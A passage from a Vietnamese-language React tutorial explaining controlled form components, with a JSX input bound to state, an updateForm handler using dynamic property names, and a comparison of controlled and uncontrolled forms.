- Ngoài ra, tất cả các input bây giờ phải có trình xử lý `onChange()` bởi vì bây giờ chúng đang được kiểm soát
- Ví dụ input đầu tiên trở thành
    
    ```jsx
    <input
     type="text"
     name="firstname"
     value={this.state.firstname}
     onChange={this.updateForm}
    />
    ```
    
- Nó sẽ là một tình huống tương tự cho các phần tử khác ngoại trừ nút gửi, vì người dùng không thay đổi giá trị của nó
- Cuối cùng, `updateForm()` . Sử dụng tên property động (target.name trong dấu ngoặc vuông), nó có thể đơn giản.
- Tất cả những gì nó cần làm là đọc giá trị phần tử form và gán cho nó state
    
    ```jsx
    updateForm({target}) {
     this.setState({
     [target.name]:
     target.type === 'checkbox' ? target.checked : target.value,
     });
    }
    ```
    
- Sau lệnh gọi `setState()` form sẽ được hiển thị lại và các value form element mới được đọc từ state đã update (vd `value={this.state.firstname}` )
- Và đây là dành cho các component được kiểm soát
- Như bạn có thể thấy, bạn cần một chút code để bắt đầu. Đây là một tin xấu. Tin tốt là bây giờ bạn có thể cập nhật các value của form từ state của mình, đó là chân lý duy nhất. `Bạn đang Controlled`
- Vậy cái nào tốt hơn, UnControlled hay Controlled? Nó phụ thuộc vào trường hợp sử dụng của bạn. Không có một lựa chọn “tốt hơn”. Cũng lưu ý rằng tại thời điểm viết bài, React chính thức có nội dung: **Trong hầu hết các trường hợp, chúng tôi mong bạn sử dụng các component được controlled để triển khai form**
- Bạn có thể kết hợp 2 loại component này với nhau không? Có thể. Trong ví dụ cuối cùng, nút “Lưu” luôn không được kiểm soát vì không có giá trị nào để kiểm soát; giá trị của nó cũng không thể bị người dùng thay đổi
- Bạn luôn có thể chọn 1 cách kết hợp: controlled component bạn cần và để các component khác cho browser
